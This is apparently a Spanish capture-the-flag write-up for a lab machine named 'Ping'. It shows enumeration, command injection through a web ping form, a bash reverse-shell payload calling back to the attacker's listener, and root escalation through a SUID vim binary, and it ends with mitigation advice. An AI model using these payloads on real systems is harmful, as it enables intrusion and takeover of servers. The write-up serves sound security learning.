# Ping — Writeup

## Enumeración

Empiezo haciendo un ping para saber qué SO usa la máquina con el TTL.

```bash
ping -c 1 172.17.0.2
```
```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.385 ms
```

Sigo enumerando con nmap para ver qué puertos abiertos tiene.

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Ping
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: CE:3D:B3:26:E1:6A (Unknown)
```

Puertos encontrados tras la enumeración:

- **80/Apache**

## Análisis puerto 80

Empiezo haciendo un curl a la web para investigar detalladamente lo que hay.

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f0f0f0; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: inline-block; }
        form { margin-top: 20px; }
        input[type="text"] { width: 300px; padding: 8px; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { padding: 8px 15px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background-color: #0056b3; }
        pre { background-color: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; text-align: left; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bienvenido a la herramienta Ping</h1>
        <p>Parece que este sistema tiene una funcionalidad para "verificar conectividad" con IPs o dominios.</p>
        <p>¡Intenta probar con la IP de Google, por ejemplo: **8.8.8.8**!</p>

        <form action="ping.php" method="GET">
            <label for="target">Introduce una IP o Dominio:</label><br>
            <input type="text" id="target" name="target" value="127.0.0.1"><br><br>
            <input type="submit" value="Enviar">
        </form>
        <hr>
        <p>by borazuwarah</p>
    </div>
</body>
</html>
```

Entro a ver la web y veo que es una herramienta para verificar la conectividad de las IPs con ping.

Nos dejan meter la IP elegida en un formulario, lo que probablemente luego ejecute un ping en alguna máquina.

Esto probablemente sea explotable porque use `shell_exec()` sin sanitizar y nos permita conseguir RCE.

Empiezo probando con `127.0.0.1 ; whoami` para comprobar la inyección de comandos.

```html
<html><head><title>Resultados de Ping</title><meta charset="UTF-8"><style>body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px;} pre { background-color: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }</style></head><body><h1>Resultados para: 127.0.0.1 ; whoami</h1><pre>www-data </pre><p><a href='index.html'>Volver</a></p></body></html>
```

Al ver que devuelve el resultado de `whoami`, prosigo intentando ejecutar una revshell.

Pongo el listener a escuchar.

```bash
nc -lvnp 4444
```

Mando el payload.

```
127.0.0.1 ; echo -n "sh -i >& /dev/tcp/172.17.0.1/4444 0>&1" | bash
```

Vuelvo a la terminal y veo que he conseguido acceso con `www-data`.

```bash
whoami
```
```
www-data
```

## Escalada de privilegios

Empiezo con `sudo -l`.

```bash
sudo -l
```
```
sh: 1: sudo: not found
```

Lo descarto.

Sigo buscando binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/vim.basic
```

```bash
ls -la /usr/bin/vim.basic
```
```
-rwsr-xr-x 1 root root 4126400 Apr  1  2025 /usr/bin/vim.basic
```

Aquí veo algo interesante: `vim` está dentro de los SUID, y al ver con qué usuario se ejecuta veo que es root, así que me dispongo a buscar un payload.

```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

Una vez ejecutado el payload compruebo qué usuario somos.

```bash
whoami
```
```
root
```

```bash
id
```
```
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

## Flujo de ataque

1. **Enumeración** — Se encuentra una web vía Apache.
2. **Explotación** — Se explota un RCE encontrado en la funcionalidad de ping de la web para ganar acceso inicial.
3. **Escalada de privilegios** — Se explota un binario SUID (`vim.basic`) para conseguir el usuario root.

## Mitigación

1. Toda entrada hecha por el usuario se debe sanear para evitar el command injection; tampoco es recomendable mandar input del usuario a un comando del sistema. Si por algún motivo hay que llamar a algún comando del sistema, sería recomendable usar `escapeshellcmd()` o `escapeshellarg()`.
2. Se le deben dar los permisos necesarios a cada usuario, evitando SUIDs como root o permisos más de los necesarios. En este caso no era necesario un SUID root de `vim` en un servidor web.